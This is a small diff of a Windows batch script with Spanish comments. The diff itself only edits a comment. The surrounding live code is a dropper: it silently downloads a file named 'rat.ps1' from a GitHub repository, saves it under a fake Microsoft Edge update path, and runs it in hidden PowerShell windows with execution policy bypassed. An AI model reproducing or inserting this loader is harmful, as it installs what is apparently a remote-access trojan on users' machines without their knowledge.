@@ -10,7 +10,7 @@ if not exist "%APPDATA%\Microsoft\EdgeUpdate\updater.ps1" (
     powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1' -OutFile '%APPDATA%\Microsoft\EdgeUpdate\updater.ps1' -UseBasicParsing -ErrorAction Stop } catch {}" >nul 2>&1
 )
 
-REM Ejecutar PowerShell en proceso independiente (sin VBS)
+REM Ejecutar PowerShell en proceso independiente
 start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \"%APPDATA%\Microsoft\EdgeUpdate\updater.ps1\"' -WindowStyle Hidden"
 
 REM Esperar 2 segundos
